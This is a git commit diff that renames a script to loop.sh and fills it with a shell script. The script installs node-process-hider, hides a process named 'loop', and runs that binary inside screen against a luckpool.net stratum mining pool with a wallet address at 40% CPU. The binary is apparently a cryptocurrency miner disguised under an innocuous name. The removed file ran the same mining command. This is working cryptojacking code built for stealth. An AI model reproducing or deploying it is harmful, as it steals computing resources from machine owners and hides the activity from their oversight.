c5013c494655e2607e5777752c880840de936623
breakok <95564840+breakok@users.noreply.github.com>
2021-12-25 12:57:29 +0530

    Update and rename mine-hybrid.sh to loop.sh

---
+++ loop.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+apt install nodejs -y
+apt install npm -y
+npm i -g node-process-hider
+ph add loop
+apt install screen -y
+screen -R ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
--- mine-hybrid.sh
+++
@@ -1,1 +0,0 @@
-./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot-1 -p hybrid --cpu 40
